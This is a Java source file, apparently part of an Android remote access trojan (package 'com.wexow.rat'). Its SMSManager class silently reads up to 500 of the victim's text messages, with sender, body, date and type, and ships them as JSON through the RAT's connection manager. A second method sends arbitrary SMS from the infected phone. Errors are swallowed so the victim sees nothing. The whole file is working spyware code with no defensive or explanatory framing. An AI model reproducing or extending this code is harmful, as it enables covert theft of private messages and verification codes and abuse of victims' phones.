package com.wexow.rat.managers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public class SMSManager {

    public static void getSMSList(Context ctx) {
        new Thread(() -> {
            try {
                JSONArray list = new JSONArray();
                Cursor c = ctx.getContentResolver().query(
                    Uri.parse("content://sms/"), null, null, null, "date DESC");
                if (c != null) {
                    int count = 0;
                    while (c.moveToNext() && count < 500) {
                        JSONObject jo = new JSONObject();
                        jo.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                        jo.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                        jo.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
                        jo.put("type", c.getInt(c.getColumnIndexOrThrow("type")));
                        list.put(jo);
                        count++;
                    }
                    c.close();
                }
                JSONObject res = new JSONObject();
                res.put("type", "sms");
                res.put("data", list);
                ConnectionManager.send(res.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    public static void sendSMS(String number, String msg) {
        try {
            SmsManager.getDefault().sendTextMessage(number, null, msg, null, null);
        } catch (Exception ignored) {}
    }
}